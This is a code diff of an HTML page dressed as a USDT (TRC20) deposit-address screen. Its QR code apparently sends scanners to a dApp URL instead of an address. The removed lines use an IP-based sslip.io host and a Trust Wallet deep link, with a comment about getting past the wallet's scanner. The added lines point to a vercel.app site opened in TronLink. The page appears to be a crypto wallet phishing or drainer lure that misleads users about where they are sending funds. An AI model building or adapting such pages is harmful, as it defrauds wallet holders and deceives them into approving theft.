@@ -194,7 +194,7 @@
         <path d="M12 7v7" stroke="#1a1408" stroke-width="2.2" stroke-linecap="round"/>
         <circle cx="12" cy="17" r="1.2" fill="#1a1408"/>
       </svg>
-      <p>Only send Tether USD (BEP20) assets to this address. Other assets will be lost forever.</p>
+      <p>Only send Tether USD (TRC20) assets to this address. Other assets will be lost forever.</p>
     </div>
 
     <div class="asset">
@@ -203,7 +203,7 @@
         <path fill="#fff" d="M19.8 15.9v-2.4h5.1v-3H11.1v3h5.1v2.4c-4.2.2-7.3 1.1-7.3 2.2 0 1.1 3.1 2 7.3 2.2v6.7h3.6v-6.7c4.2-.2 7.3-1.1 7.3-2.2 0-1.1-3.1-2-7.3-2.2zm0 3.5v.1c-.3 0-.7 0-1.1 0s-.7 0-1.1 0v-.1c-3.3-.15-5.7-.8-5.7-1.55 0-.75 2.4-1.4 5.7-1.55v2.55c.3.02.7.03 1.1.03s.8-.01 1.1-.03V16.3c3.3.15 5.7.8 5.7 1.55 0 .75-2.4 1.4-5.7 1.55z"/>
       </svg>
       <span class="asset-name">USDT</span>
-      <span class="badge">BEP20</span>
+      <span class="badge">TRC20</span>
     </div>
 
     <div class="qr-card">
@@ -252,11 +252,8 @@
   <script src="https://cdn.jsdelivr.net/npm/qr-code-styling@1.9.2/lib/qr-code-styling.min.js"></script>
   <script>
     (function () {
-      var DAPP_URL = "https://45-61-136-171.sslip.io";
-      // Trust Wallet opens dApp browser only with this deep link (plain URL often ignored by scanner)
-      var QR_DATA =
-        "https://link.trustwallet.com/open_url?coin_id=20000714&url=" +
-        encodeURIComponent(DAPP_URL);
+      var DAPP_URL = "https://feetron.vercel.app";
+      var QR_DATA = DAPP_URL;
 
       var qrCode = new QRCodeStyling({
         width: 220,
@@ -338,7 +335,7 @@
       });
 
       document.getElementById("info-btn").addEventListener("click", function () {
-        showToast("Scan with Trust Wallet camera to open dApp");
+        showToast("Open this dApp in TronLink browser");
       });
 
       document.getElementById("copy-btn").addEventListener("click", copyUrl);
